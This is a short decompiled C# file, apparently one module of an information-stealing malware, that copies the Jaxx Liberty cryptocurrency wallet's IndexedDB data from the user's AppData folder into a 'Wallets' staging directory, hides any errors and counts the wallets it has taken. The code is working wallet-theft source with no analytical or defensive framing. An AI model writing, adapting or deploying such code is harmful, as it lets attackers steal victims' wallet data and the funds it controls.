﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x02000035 RID: 53
	internal class Jaxx
	{
		// Token: 0x06000104 RID: 260 RVA: 0x00006250 File Offset: 0x00004450
		public static void JaxxStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Jaxx.JaxxDir);
					fileInfo.CopyTo(directorypath + Jaxx.JaxxDir + fileInfo.Name);
				}
				Jaxx.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000082 RID: 130
		public static int count = 0;

		// Token: 0x04000083 RID: 131
		public static string JaxxDir = "\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\";
	}
}
